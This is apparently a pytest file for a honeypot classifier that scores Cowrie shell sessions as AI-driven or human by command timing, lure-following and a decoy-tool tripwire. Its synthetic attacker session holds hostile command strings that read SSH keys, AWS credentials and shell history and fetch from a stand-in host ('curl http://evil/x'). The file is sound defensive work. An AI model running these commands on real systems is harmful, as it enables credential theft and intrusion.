"""Unit tests for the three-channel AI-vs-human classifier (chimera.classifier).

Synthetic sessions only — no live Splunk. Verifies:
  * fast/periodic + lure-following -> AI;
  * slow/cautious, lure-ignoring -> HUMAN/UNDECIDED (never AI);
  * a Beelzebub tripwire fire -> AI decisively on its own;
  * the combination math (channels add on a log-prior; logistic posterior;
    Wald thresholds) and the idx_deception event shape.
"""

from __future__ import annotations

import json

import pytest

from chimera.classifier import (
    AI_THRESHOLD,
    HUMAN_THRESHOLD,
    Classification,
    classify,
    classify_session,
    combine_log_lrs,
)


def _cmd_event(cmd: str, session: str, src_ip: str, ts: float) -> dict:
    return {
        "_raw": json.dumps(
            {
                "eventid": "cowrie.command.input",
                "input": cmd,
                "session": session,
                "src_ip": src_ip,
            }
        ),
        "src_ip": src_ip,
        "_time": ts,
    }


def _ai_session() -> list[dict]:
    cmds = [
        "ls -la /home/admin",
        "cat /home/admin/credentials.txt",
        "cat /root/.aws/credentials",
        "cat .ssh/id_rsa",
        "cat .bash_history",
        "whoami",
        "id",
        "curl http://evil/x",
    ]
    base = 1_000_000.0
    return [
        _cmd_event(c, "sessAI", "10.0.0.9", base + i * 0.2)  # fast 0.2s periodic
        for i, c in enumerate(cmds)
    ]


def _human_session() -> list[dict]:
    cmds = ["ls", "pwd", "whoami", "ls -la /tmp", "cat /etc/passwd", "uname -a", "exit"]
    gaps = [0.0, 3.1, 8.0, 2.0, 15.0, 5.5, 20.0]
    ts = 1_000_000.0
    out = []
    for c, g in zip(cmds, gaps):
        ts += g
        out.append(_cmd_event(c, "sessH", "10.0.0.10", ts))
    return out


# --------------------------------------------------------------------------
# Combination math
# --------------------------------------------------------------------------
def test_thresholds_are_wald() -> None:
    import math

    assert abs(AI_THRESHOLD - math.log(0.95 / 0.05)) < 1e-9
    assert abs(HUMAN_THRESHOLD - math.log(0.05 / 0.95)) < 1e-9
    assert AI_THRESHOLD > 0 > HUMAN_THRESHOLD


def test_combine_adds_channels_on_neutral_prior() -> None:
    combined, p_ai, verdict = combine_log_lrs(0.5, 1.0, 0.0, prior_ai=0.5)
    # neutral prior -> log-prior 0 -> combined == sum of channels.
    assert abs(combined - 1.5) < 1e-9
    assert 0.0 < p_ai < 1.0
    assert verdict is Classification.UNDECIDED  # 1.5 < AI_THRESHOLD ≈ 2.944


def test_combine_tripwire_alone_decides_ai() -> None:
    combined, p_ai, verdict = combine_log_lrs(0.0, 0.0, 6.0)
    assert verdict is Classification.AI
    assert p_ai > 0.9


def test_combine_strong_human_decides_human() -> None:
    combined, p_ai, verdict = combine_log_lrs(-1.2, -0.6, 0.0, prior_ai=0.2)
    # log-prior(0.2) ≈ -1.386; total ≈ -3.186 <= HUMAN_THRESHOLD.
    assert verdict is Classification.HUMAN
    assert p_ai < 0.1


# --------------------------------------------------------------------------
# End-to-end on synthetic sessions
# --------------------------------------------------------------------------
def test_ai_session_classifies_ai() -> None:
    r = classify(_ai_session())
    assert r.classification is Classification.AI
    assert r.p_ai > 0.5
    assert r.channels["timing"] > 0
    assert r.channels["behavioral"] > 0
    assert r.channels["tripwire"] == 0.0
    assert r.src_ip == "10.0.0.9"
    assert r.session == "sessAI"


def test_human_session_not_ai() -> None:
    r = classify(_human_session())
    assert r.classification is not Classification.AI
    assert r.p_ai < 0.5
    assert r.channels["timing"] < 0
    assert r.channels["behavioral"] < 0


def test_tripwire_makes_even_quiet_session_ai() -> None:
    # A short, slow session with no lure pursuit but the decoy tool fired.
    events = [_cmd_event("ls", "sessT", "10.0.0.11", 1_000_000.0)]
    tripwire = [
        {"_raw": json.dumps({"tool": "user-account-manager", "session": "sessT"})}
    ]
    r = classify(events, tripwire_events=tripwire, session="sessT")
    assert r.classification is Classification.AI
    assert r.channels["tripwire"] >= 6.0
    assert r.p_ai > 0.9


def test_classification_event_shape() -> None:
    r = classify(_ai_session())
    ev = r.to_event()
    assert ev["type"] == "classification"
    assert ev["classification"] == "AI"
    assert ev["src_ip"] == "10.0.0.9"
    assert ev["session"] == "sessAI"
    assert set(ev["channels"]) == {"timing", "behavioral", "tripwire"}
    assert 0.0 <= ev["p_ai"] <= 1.0
    assert abs(ev["p_ai"] + ev["p_human"] - 1.0) < 1e-6
    assert isinstance(ev["ts"], int)


# --------------------------------------------------------------------------
# Async session entry point with a fake MCP client
# --------------------------------------------------------------------------
class _FakeClient:
    """Returns Cowrie events for the session query, decoy events for the
    beelzebub query, keyed by which sourcetype the SPL mentions."""

    def __init__(self, cowrie_rows, beelz_rows):
        self._cowrie = cowrie_rows
        self._beelz = beelz_rows

    async def run_query(self, spl):
        if "beelzebub:json" in spl:
            return self._beelz
        return self._cowrie


@pytest.mark.asyncio
async def test_classify_session_fetches_and_classifies_ai() -> None:
    client = _FakeClient(_ai_session(), [])
    r = await classify_session(client, "10.0.0.9", session="sessAI")
    assert r.classification is Classification.AI


@pytest.mark.asyncio
async def test_classify_session_tripwire_overrides_quiet_session() -> None:
    cowrie = [_cmd_event("ls", "sessT", "10.0.0.11", 1_000_000.0)]
    beelz = [{"_raw": json.dumps({"tool": "user-account-manager", "session": "sessT"})}]
    client = _FakeClient(cowrie, beelz)
    r = await classify_session(client, "10.0.0.11", session="sessT")
    assert r.classification is Classification.AI
    assert r.channels["tripwire"] >= 6.0
